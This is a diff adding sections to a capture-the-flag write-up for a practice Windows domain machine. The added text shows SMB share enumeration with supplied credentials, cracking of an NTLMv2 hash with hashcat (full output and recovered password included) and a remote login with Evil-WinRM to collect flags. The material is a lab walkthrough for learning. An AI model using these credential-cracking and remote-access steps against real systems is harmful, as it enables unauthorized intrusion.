@@ -347,4 +347,136 @@ Ayyy
 
 But ... trying this out for the admin page doesn't work. So, dead end there.
 
-Enough for today :D
+Let's try instead logging in with the username and the password that we have got. We use `smbmap` to enumerate the drives across an entire domain.
+
+```
+❯ smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
+[+] IP: windcorp.thm:445        Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Shared                                                  READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+
+```
+
+Let's try going in using `smbclient`.
+
+`❯ smbclient //10.10.73.52/Shared -U lilyle --password ChangeMe#1234`
+
+```
+smb: \> ls
+  .                                   D        0  Fri May 29 20:45:42 2020
+  ..                                  D        0  Fri May 29 20:45:42 2020
+  Flag 1.txt                          A       45  Fri May  1 11:32:36 2020
+  spark_2_8_3.deb                     A 29526628  Fri May 29 20:45:01 2020
+  spark_2_8_3.dmg                     A 99555201  Sun May  3 07:06:58 2020
+  spark_2_8_3.exe                     A 78765568  Sun May  3 07:05:56 2020
+  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 07:07:24 2020
+
+                15587583 blocks of size 4096. 10913105 blocks available
+smb: \> get "Flag 1.txt"
+getting file \Flag 1.txt of size 45 as Flag 1.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+
+Then cat it on your system. First flag done!
+
+## 3. Foothold
+
+Now this spark thing has been popping up a lot, and I see no other alternative to go. Can't be bothered to download the actual `.deb`, so I'll just get from here :P
+
+At this point, you'd install the deb and do some magic, which I couldn't. Some java bt (bad time). So, I went to a writeup, and took this NTLMv2 hash, and restarted from there.
+
+(btw ... buse, the person whom we use is the one on the IT staff list)
+
+```
+❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i3-6006U CPU @ 2.00GHz, 2726/2790 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.                                                                        
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+BUSE::WINDCORP:4ce69722d0715c4e:d182f429d3f8e1899fe6152a31f04df0:01010000000000004b749f876555d6014350ab75446d0e3a000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c00080030003000000000000000010000000020000073b171a2270f43dc6457d587e7ed686ba5cb926d2746466aa21e11ff6a99e5a00a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NetNTLMv2
+Hash.Target......: BUSE::WINDCORP:4ce69722d0715c4e:d182f429d3f8e1899fe...000000
+Time.Started.....: Sun Feb 21 23:42:21 2021 (4 secs)
+Time.Estimated...: Sun Feb 21 23:42:25 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   846.1 kH/s (3.99ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 2961408/14344385 (20.65%)
+Rejected.........: 0/2961408 (0.00%)
+Restore.Point....: 2957312/14344385 (20.62%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: v10014318 -> utrox11
+
+Started: Sun Feb 21 23:41:48 2021
+Stopped: Sun Feb 21 23:42:26 2021
+```
+
+We get the password `uzunLM+3131`!
+
+Time to get into the machine. We will use `Evil-WinRM`. (go to the github page for instructions on how to download)
+
+Looking around we have the second flag!
+
+```
+*Evil-WinRM* PS C:\Users\buse\Desktop> ls
+
+
+    Directory: C:\Users\buse\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/7/2020   3:00 AM                Also stuff
+d-----         5/7/2020   2:58 AM                Stuff
+-a----         5/2/2020  11:53 AM             45 Flag 2.txt
+-a----         5/1/2020   8:33 AM             37 Notes.txt
+
+
+```
+
+so ... its time ...
+
+## 4. Priv Esc
+
+For next time!
